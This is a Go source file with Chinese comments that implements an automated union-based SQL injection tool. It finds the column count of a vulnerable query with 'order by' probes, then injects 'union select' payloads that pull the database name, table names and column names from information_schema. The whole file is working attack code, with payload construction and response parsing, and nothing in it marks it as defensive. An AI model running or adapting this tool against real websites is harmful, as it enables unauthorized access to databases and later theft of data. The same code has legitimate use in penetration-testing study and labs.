package pkg

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

// 联合注入
func UnionInject(host string) error {
	fmt.Println("Starting Union-based SQL injection...")
	
	// 判断列数
	columnCount, err := getColumnCount(host)
	if err != nil {
		return err
	}
	fmt.Printf("Column count: %d\n", columnCount)
	
	// 查找数据库
	databaseName, err := getDatabaseNameUnion(host, columnCount)
	if err != nil {
		return err
	}
	fmt.Printf("Database name: %s\n", databaseName)
	
	// 获取表名
	tableNames, err := getTableNames(host, columnCount, databaseName)
	if err != nil {
		return err
	}
	fmt.Printf("Table names: %v\n", tableNames)
	
	// 获取列名
	if len(tableNames) > 0 {
		columnNames, err := getColumnNames(host, columnCount, databaseName, tableNames[0])
		if err != nil {
			return err
		}
		fmt.Printf("Column names for table %s: %v\n", tableNames[0], columnNames)
	}
	
	return nil
}

// 获取列数
func getColumnCount(host string) (int, error) {
	for i := 1; i <= 20; i++ {
		payload := fmt.Sprintf(" order by %d", i)
		url := host + url.QueryEscape(payload)
		
		req, err := http.Get(url)
		if err != nil {
			return 0, err
		}
		defer req.Body.Close()
		
		body, _ := io.ReadAll(req.Body)
		response := string(body)
		
		// 检查是否有错误信息
		errorPatterns := []string{
			"Unknown column",
			"Unknown column",
			"order by",
			"ORDER BY",
		}
		
		for _, pattern := range errorPatterns {
			if strings.Contains(response, pattern) {
				return i - 1, nil
			}
		}
	}
	return 0, fmt.Errorf("could not determine column count")
}

// 获取数据库名（联合注入）
func getDatabaseNameUnion(host string, columnCount int) (string, error) {
	// 构造联合查询payload
	selectClause := "1"
	for i := 2; i <= columnCount; i++ {
		selectClause += fmt.Sprintf(",%d", i)
	}
	
	// 将database()放在不同位置尝试
	for i := 1; i <= columnCount; i++ {
		selectParts := make([]string, columnCount)
		for j := 0; j < columnCount; j++ {
			if j == i-1 {
				selectParts[j] = "database()"
			} else {
				selectParts[j] = strconv.Itoa(j + 1)
			}
		}
		
		payload := fmt.Sprintf("-1 union select %s", strings.Join(selectParts, ","))
		url := host[:strings.LastIndex(host, "=")+1] + url.QueryEscape(payload)
		
		req, err := http.Get(url)
		if err != nil {
			continue
		}
		defer req.Body.Close()
		
		body, _ := io.ReadAll(req.Body)
		response := string(body)
		
		// 尝试从响应中提取数据库名
		dbName := extractDatabaseName(response)
		if dbName != "" {
			return dbName, nil
		}
	}
	
	return "", fmt.Errorf("could not extract database name")
}

// 获取表名
func getTableNames(host string, columnCount int, databaseName string) ([]string, error) {
	selectParts := make([]string, columnCount)
	selectParts[0] = "1"
	selectParts[1] = fmt.Sprintf("group_concat(table_name)")
	for i := 2; i < columnCount; i++ {
		selectParts[i] = strconv.Itoa(i + 1)
	}
	
	payload := fmt.Sprintf("-1 union select %s from information_schema.tables where table_schema='%s'", 
		strings.Join(selectParts, ","), databaseName)
	url := host[:strings.LastIndex(host, "=")+1] + url.QueryEscape(payload)
	
	req, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer req.Body.Close()
	
	body, _ := io.ReadAll(req.Body)
	response := string(body)
	
	// 从响应中提取表名
	tableNames := extractTableNames(response)
	return tableNames, nil
}

// 获取列名
func getColumnNames(host string, columnCount int, databaseName, tableName string) ([]string, error) {
	selectParts := make([]string, columnCount)
	selectParts[0] = "1"
	selectParts[1] = fmt.Sprintf("group_concat(column_name)")
	for i := 2; i < columnCount; i++ {
		selectParts[i] = strconv.Itoa(i + 1)
	}
	
	payload := fmt.Sprintf("-1 union select %s from information_schema.columns where table_schema='%s' and table_name='%s'", 
		strings.Join(selectParts, ","), databaseName, tableName)
	url := host[:strings.LastIndex(host, "=")+1] + url.QueryEscape(payload)
	
	req, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer req.Body.Close()
	
	body, _ := io.ReadAll(req.Body)
	response := string(body)
	
	// 从响应中提取列名
	columnNames := extractColumnNames(response)
	return columnNames, nil
}

// 从响应中提取数据库名
func extractDatabaseName(response string) string {
	// 简单的正则匹配，可能需要根据实际情况调整
	re := regexp.MustCompile(`[a-zA-Z_][a-zA-Z0-9_]*`)
	matches := re.FindAllString(response, -1)
	
	// 过滤掉常见的非数据库名
	commonWords := map[string]bool{
		"html": true, "body": true, "div": true, "span": true, "table": true,
		"tr": true, "td": true, "th": true, "p": true, "a": true, "img": true,
		"script": true, "style": true, "title": true, "head": true,
	}
	
	for _, match := range matches {
		if len(match) > 2 && !commonWords[match] {
			return match
		}
	}
	return ""
}

// 从响应中提取表名
func extractTableNames(response string) []string {
	// 假设表名用逗号分隔
	re := regexp.MustCompile(`[a-zA-Z_][a-zA-Z0-9_]*`)
	matches := re.FindAllString(response, -1)
	
	// 过滤和去重
	tableNames := make([]string, 0)
	seen := make(map[string]bool)
	
	for _, match := range matches {
		if len(match) > 2 && !seen[match] {
			tableNames = append(tableNames, match)
			seen[match] = true
		}
	}
	
	return tableNames
}

// 从响应中提取列名
func extractColumnNames(response string) []string {
	return extractTableNames(response) // 使用相同的逻辑
}
